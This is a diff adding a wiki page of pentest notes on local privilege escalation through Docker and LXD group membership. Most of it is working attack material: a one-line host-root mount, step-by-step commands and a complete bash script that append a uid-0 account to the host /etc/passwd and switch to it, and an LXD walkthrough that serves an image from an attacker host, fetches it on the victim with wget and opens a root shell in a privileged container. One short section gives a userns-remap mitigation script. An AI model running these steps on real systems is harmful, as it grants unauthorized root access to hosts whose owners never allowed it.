@@ -1,0 +1,184 @@
+<!--
+title: Escape Docker, LXD
+description: 
+published: true
+date: 2023-06-17T16:57:13.542Z
+tags: 
+editor: ckeditor
+dateCreated: 2023-06-17T16:57:13.542Z
+-->
+
+<h1>Docker abuse</h1>
+<p>Quick and dirty. If you're in the Docker group:</p>
+<blockquote>
+  <p>docker run -v /:/mnt --rm -it bash chroot /mnt sh</p>
+</blockquote>
+<h2>1- Quick Definitions</h2>
+<p><strong>What is Docker ?</strong></p>
+<p>Docker is a tool designed to make it easier to create, deploy, and run applications by using containers. Containers allow a developer to package up an application with all of the parts it needs, such as libraries and other dependencies, and deploy it as one package.</p>
+<figure class="image"><img src="https://flast101.github.io/docker-privesc/schema.png" alt="schema.png"></figure>
+<p><strong>What are containers ?</strong></p>
+<p>Containers are an abstraction at the app layer that packages code and dependencies together. Multiple containers can run on the same machine and share the OS kernel with other containers, each running as isolated processes in user space.</p>
+<p><strong>What is a VM ?</strong></p>
+<p>Virtual machines (VMs) are an abstraction of physical hardware turning one server into many servers. The hypervisor allows multiple VMs to run on a single machine. Each VM includes a full copy of an operating system, the application, necessary binaries and libraries.</p>
+<hr>
+<h2>2- Real Facts</h2>
+<h3>How does it work ?</h3>
+<p>A container is run from an image. An image is built using a Dockerfile. Here are some usefull commands:</p>
+<p><strong>Docker Hub:</strong><br>By default connected to the <a href="https://hub.docker.com/">Docker Hub</a>, a place which contains base images you can use to run a container.</p>
+<p><strong>Run a container:</strong><br><code><strong>docker run -di --name flast101 alpine:latest</strong></code><br>-d: detach<br>-i: interactive</p>
+<p><strong>Connect to an interactive container with a shell:</strong><br><code><strong>docker exec -ti flast101 sh</strong></code><br>-t: terminal<br>-i: interactive</p>
+<p><strong>Run to an interactive container with a shell:</strong><br><code><strong>docker run --name flast101 alpine:latest sh</strong></code><br>-t: terminal<br>-i: interactive</p>
+<p><strong>List containers:</strong><br><code><strong>docker ps -a</strong></code></p>
+<p><strong>remove a container:</strong><br><code><strong>docker rm -f flast101</strong></code></p>
+<p><strong>Create image from the Dockerfile:</strong><br><code><strong>docker build -t myimage:version .</strong></code></p>
+<p><strong>List images:</strong><br><code><strong>docker images</strong></code></p>
+<p><strong>Remove image</strong><br><code><strong>docker image rm flast101:v1.0</strong></code></p>
+<h3>Key points to understand:</h3>
+<ul>
+  <li>By default, any machine container is run with root privileges (ie. you have root privileges inside the container). It means that any user (by default, any member of the “docker” group) who has access to the Docker Daemon has root privileges in the container.</li>
+  <li>Sometimes you will want to remove a container and rerun it because you updated the image (or changed the Dockerfile). If you need to remove a container, data changes you made are not persistent. We usually mount a host directory to access persistent data from the container.</li>
+</ul>
+<p>For example for a web site example, you will run a container using the following command if you want to run a nginx server:</p>
+<pre><code class="language-plaintext">docker run -tid -p 8080:80 -v /srv/data/nginx/:/usr/share/nginx/html/ --name flast101 nginx:latest
+</code></pre>
+<p><i><strong>/srv/data/nginx/</strong></i> is host directory to be shared. In this case, it contains the pages of your web site.<br><i><strong>/usr/share/nginx/html/</strong></i> is the target directory in the container where the files are used.<br>That’s great ! Your site contents are persistent, you can modify them independently from the web server, and you can update and maintain the web server without affecting the web site content. An (almost) perfect wolrd.</p>
+<p>Now, let’s suppose you are the admin and you want John to be able to run a container for whatever reason. You add John in the “docker” group or give him the ability to run docker as a sudoer. Fine, John can handle the web site or any other application you want him to run/maintain.<br><strong>But what if John runs a container using this command:</strong> <code><strong>docker run -tid -v /etc/:/mnt/ --name flast101 ubuntu:latest bash</strong></code></p>
+<p>This is where security problems arise: he can easily read and write the <code><strong>/etc/shadow</strong></code> file, and he can also create a new root user by entering it directly in the <code><strong>/etc/passwd</strong></code> file… WTF are you doing John !? ;-)</p>
+<hr>
+<h2>3- GTFOBins</h2>
+<p>If you like pentest and CTF, you know <a href="https://gtfobins.github.io/">GTFOBins</a>. If you don’t, you should take a look.<br>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<p>There are some inputs about Docker <a href="https://gtfobins.github.io/gtfobins/docker">here</a>:</p>
+<figure class="image"><img src="https://flast101.github.io/docker-privesc/GTFObins.png" alt="GTFObins.png"></figure>
+<p>Let’s take a look to the command used to to get an interactive shell:<br><code><strong>docker run -v /:/mnt --rm -it alpine chroot /mnt sh</strong></code></p>
+<p>The container is based on Alpine, a lightweight linux distribution, and the root directory “/” is accessible in the “/mnt” directory. It also spawns a shell and if you type “id” you will see you are granted with root privileges… although you are still in the container, not in the host machine.<br>But hey, if you are trying to get the root flag in a CTF, you have it.</p>
+<hr>
+<h2>4- Exploiting The Vulnerability</h2>
+<p>Now we know everything about this, what should I do to exploit it properly ?</p>
+<p><strong>1. Check if the active user can run the Docker daemon</strong><br>If you can not run it, you will get something like this:</p>
+<figure class="image"><img src="https://flast101.github.io/docker-privesc/noperm.png" alt="noperm.png"></figure>
+<p><strong>2. Prepare a new root user.</strong><br>The plan is to create a new root user by entering it directly in the <code><strong>/etc/passwd</strong></code> file.<br>With openssl, I can generate a password hashed with md5crypt which is valid in Linux. I choose a user <code><strong>$rootname</strong></code> with the password <code><strong>$passw</strong></code> and the salt <code><strong>$salt</strong></code> to generate the password hash. These will be variables in the script but with real values it should look like this:</p>
+<pre><code class="language-plaintext">user@linux:~$ openssl passwd -1 -salt evil newrootpass
+$1$evil$eu2ySQGNgNghQm4ASTnKa.
+</code></pre>
+<p><strong>3. Prepare a file </strong><code><strong>new_account</strong></code><strong> that contains the line I want to add to </strong><code><strong>/etc/passwd</strong></code><strong> on the host machine.</strong><br>This line will look like this:</p>
+<pre><code class="language-plaintext">user@linux:~$ cat new_account
+newroot:$1$evil$eu2ySQGNgNghQm4ASTnKa.:0:0:root:/root:/bin/bash 
+</code></pre>
+<p><strong>4. Run the container with a volume mounted making both the file </strong><code><strong>new_account</strong></code><strong> and </strong><code><strong>/etc/passwd</strong></code><strong> accessible from the container:</strong></p>
+<pre><code class="language-plaintext">docker run -tid -v /:/mnt/ --name flast101 alpine
+</code></pre>
+<p><strong>5. Execute a bash command in the container that will add the new root user to the /etc/passwd file:</strong></p>
+<pre><code class="language-plaintext">docker exec -ti flast101 sh -c "cat /mnt/tmp/new_account &gt;&gt; /mnt/etc/passwd"
+</code></pre>
+<p><strong>6. Remove the </strong><code><strong>new_account</strong></code><strong> file and login as root to the host.</strong></p>
+<hr>
+<h2>5- POC Script</h2>
+<p>Requirements:</p>
+<ul>
+  <li>Access to a shell on the target with a user that can run Docker.</li>
+  <li>The target should have either an internet connection or an image installed in Docker. Use <code><strong>docker images</strong></code> to check and change the “alpine” image accordingly. If there is no image go to <a href="https://hub.docker.com/">https://hub.docker.com</a> to get one (tar.gz file with its Dockerfile) and upload it on the target in your working directory.</li>
+</ul>
+<p>Now let’s put this down in a bash script:</p>
+<pre><code class="language-plaintext">#!/bin/bash
+
+docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 ) 
+
+if [ $(id -u) -eq 0 ]; then
+    echo "The user islready root. Have fun ;-)"
+    exit
+    
+elif [ "$docker_test" == "CONTAINER ID" ]; then
+    echo 'Please write down your new root credentials.'
+    read -p 'Choose a root user name: ' rootname
+    read -s -p 'Choose a root password: ' passw
+    hpass=$(openssl passwd -1 -salt mysalt $passw)
+
+    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" &gt; new_account
+    mv new_account /tmp/new_account
+    docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
+    docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account &gt;&gt; /mnt/etc/passwd"
+    sleep 1; echo '...'
+    
+    echo 'Success! Root user ready. Enter your password to login as root:'
+    docker rm -f flast101.github.io
+    docker image rm alpine
+    rm /tmp/new_account
+    su $rootname
+
+else echo "Your account does not have permission to execute docker or docker is not running, aborting..."
+    exit
+
+fi
+</code></pre>
+<p>Example:</p>
+<figure class="image"><img src="https://flast101.github.io/docker-privesc/privesc.png" alt="privesc.png"></figure>
+<hr>
+<h2>6- Mitigation</h2>
+<p>I could read here and there that you “should not use the docker group”. This is just wrong. We just saw that it is not a matter of group, and moreover, in any organization you will need other accounts than root to be able to run docker. As usual, the first thing to do is simply apply the principle of least privilege (PoLP), starting with allowing as few people as possible to run docker. Then, isolating docker from your host machine is essential.</p>
+<p>The principle is to create a user whose uid is unlikely to be used. Then have the docker daemon use it for launching containers.</p>
+<p>Docker proposes an <a href="https://docs.docker.com/engine/security/userns-remap/#enable-userns-remap-on-the-daemon">official documentation</a> to realise this mitigation.</p>
+<p>Here is a short script based on this documentation that will help you mitigate this vulnerability:</p>
+<pre><code class="language-plaintext">#!/bin/bash
+
+groupadd -g 99999 dockremap &amp;&amp; 
+useradd -u 99999 -g dockremap -s /bin/false dockremap &amp;&amp; 
+echo "dockremap:99999:65536" &gt;&gt; /etc/subuid &amp;&amp; 
+echo "dockremap:99999:65536" &gt;&gt;/etc/subgid
+
+echo "
+  {
+   \"userns-remap\": \"default\"
+  }
+" &gt; /etc/docker/daemon.json
+
+systemctl daemon-reload &amp;&amp; systemctl restart docker
+</code></pre>
+<p><strong>Example:</strong></p>
+<p>By default, the process is run as root in the container:</p>
+<figure class="image"><img src="https://flast101.github.io/docker-privesc/nomitig.png" alt="nomitig.png"></figure>
+<p>Applying the mitigation, we can get rid of this problem. The user “dockremap” is now running the process:</p>
+<figure class="image"><img src="https://flast101.github.io/docker-privesc/mitig.png" alt="mitig.png"></figure>
+<p>Stay curious !</p>
+<h1>LXD Privilege escalation</h1>
+<h2><strong>Identifying the Vulnerability</strong></h2>
+<p>The common ways to find the current user’s groups such as the “groups” command can be used to identify whether this vulnerability exists on the target host:</p>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image.png?resize=810%2C77&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image.png?w=824&amp;ssl=1 824w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image.png?resize=300%2C28&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image.png?resize=768%2C73&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image.png?resize=400%2C38&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image.png?resize=100%2C9&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
+<p>Automated enumeration tools such as LinPEAS can also be used to identify the current user’s groups:</p>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=810%2C657&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?w=927&amp;ssl=1 927w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=300%2C243&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=768%2C623&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=814%2C660&amp;ssl=1 814w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=400%2C324&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=431%2C350&amp;ssl=1 431w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-1.png?resize=71%2C58&amp;ssl=1 71w" sizes="100vw" width="810"></figure>
+<p>In this specific case, the LXD group is assigned, meaning the current user has access to create system containers as root.</p>
+<h2><strong>Exploitation</strong></h2>
+<p>The easiest way to exploit this misconfiguration is to build an image of Alpine, a lightweight Linux distribution, and start it using the security.privileged=true flag, forcing the container to interact as root with the host filesystem and therefore allowing to read/write/execute root-level files.</p>
+<p>The first step is to clone and install the following GitHub repository on the Kali host, which is an image of Alpine Linux specifically designed for LXC/LXD containers:</p>
+<pre><code class="language-plaintext">git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder/
+sudo ./build-alpine</code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=810%2C243&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=1024%2C307&amp;ssl=1 1024w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=300%2C90&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=768%2C230&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=400%2C120&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?resize=100%2C30&amp;ssl=1 100w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-6.png?w=1034&amp;ssl=1 1034w" sizes="100vw" width="810"></figure>
+<p>If during this the build an error comes up, that could mean the mirrors used are not valid. Simply edit the rootfs/usr/share/alpine-mirrors/MIRRORS.txt file and remove all of the mirrors apart from the first one:</p>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=810%2C650&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?w=842&amp;ssl=1 842w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=300%2C241&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=768%2C617&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=822%2C660&amp;ssl=1 822w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=400%2C321&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=436%2C350&amp;ssl=1 436w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-7.png?resize=72%2C58&amp;ssl=1 72w" sizes="100vw" width="810"></figure>
+<p>The next step is to transfer the image in .tar.gz format to the target host, this can be done using the Python Simple HTTP Server on the Kali host and Wget on the victim host, or one of the techniques outlined in <a href="https://steflan-security.com/?p=1545"><u>this</u></a> cheat sheet.</p>
+<pre><code class="language-plaintext">#Setup HTTP server to host the image
+sudo python -m SimpleHTTPServer 80
+#Download the image remotely using Wget
+wget http://X.X.X.X/alpine-vX.XX-1686-XXXXXXXX_XXXX.tar.gz</code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=810%2C274&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?w=849&amp;ssl=1 849w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=300%2C101&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=768%2C260&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=400%2C135&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-13.png?resize=100%2C34&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
+<p>The next step is to import the image using the LXC command-line tool. It’s important doing this from YOUR HOME directory on the victim machine, or it might fail.</p>
+<pre><code class="language-plaintext">lxc image import ./alpine.tar.gz --alias myimage </code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=810%2C95&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?w=881&amp;ssl=1 881w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=300%2C35&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=768%2C90&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=400%2C47&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-9.png?resize=100%2C12&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
+<p>As suggested by LXC, before actually using the image it should be initialized and its storage pool should be configured. The default selections will work just fine:</p>
+<pre><code class="language-plaintext">lxd init</code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=810%2C246&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?w=916&amp;ssl=1 916w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=300%2C91&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=768%2C233&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=400%2C121&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-10.png?resize=100%2C30&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
+<p>The image can then be run using the run the security.privileged flag set to true, which will grant the current user unconditioned root access to it:</p>
+<pre><code class="language-plaintext">lxc init myimage mycontainer -c security.privileged=true </code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-14.png?resize=810%2C48&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-14.png?w=825&amp;ssl=1 825w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-14.png?resize=300%2C18&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-14.png?resize=768%2C46&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-14.png?resize=400%2C24&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-14.png?resize=100%2C6&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
+<p>The next step is to mount the root folder the container, under /mnt/root:</p>
+<pre><code class="language-plaintext">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true </code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-16.png?resize=810%2C47&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-16.png?w=946&amp;ssl=1 946w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-16.png?resize=300%2C17&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-16.png?resize=768%2C45&amp;ssl=1 768w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-16.png?resize=400%2C23&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-16.png?resize=100%2C6&amp;ssl=1 100w" sizes="100vw" width="810"></figure>
+<p>The last thing to do is to start the container and to use the “exec” lxc command to execute a command from it, in this case an sh shell:</p>
+<pre><code class="language-plaintext">lxc start mycontainer
+lxc exec mycontainer /bin/sh
+</code></pre>
+<figure class="image"><img src="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=686%2C150&amp;ssl=1" alt="" srcset="https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?w=686&amp;ssl=1 686w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=300%2C66&amp;ssl=1 300w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=400%2C87&amp;ssl=1 400w, https://i0.wp.com/steflan-security.com/wp-content/uploads/2021/03/image-17.png?resize=100%2C22&amp;ssl=1 100w" sizes="100vw" width="686"></figure>
+<p>This has granted a root-privilege shell on the target system.</p>
+<p>Alternatively, this automated exploit can do the heavy lifting: <a href="https://github.com/initstring/lxd_root"><u>https://github.com/initstring/lxd_root</u></a>.</p>
+<p>&nbsp;</p>
